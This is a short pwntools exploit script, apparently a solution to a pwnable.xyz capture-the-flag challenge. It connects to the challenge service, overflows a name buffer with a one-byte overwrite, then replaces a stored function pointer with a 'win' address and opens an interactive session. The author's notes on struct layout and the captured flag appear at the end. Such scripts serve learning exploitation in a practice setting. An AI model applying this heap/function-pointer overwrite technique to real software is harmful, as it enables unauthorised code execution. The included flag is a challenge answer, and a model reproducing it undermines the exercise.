from pwn import *
import time

context.terminal = ['kitty', '-e']

r = process('./challenge')
r = remote('svc.pwnable.xyz', 30023)

win = 0x40092c 

r.sendlineafter("> ", "1")

payload = b"A" * 0x20
r.sendafter(": ", payload)


r.sendlineafter("> ", "2")
r.sendlineafter(": ", "0")

# gdb.attach(r)
# time.sleep(1)

payload = b"B" * 0x20 
payload += b'\x30'
r.sendafter(": ", payload)

r.sendlineafter("> ", "2")
r.sendlineafter(": ", "0")

payload = b"C" * 0x28
payload += p64(win)
r.sendafter(": ", payload)

r.sendlineafter("> ", "3")

r.interactive()


'''
TODO:
Make catalogue struct to understand
how to index into the right thing
rax + 0x28 
0x28 / 0x8 = 5, 5th position
print_name function is at malloc_buf + 0x28
al[4] <-- size of thing
ok so im thinking multiple structs and we can overwrite stuff 
'''
 # flag: FLAG{I_should_start_using_strnlen}

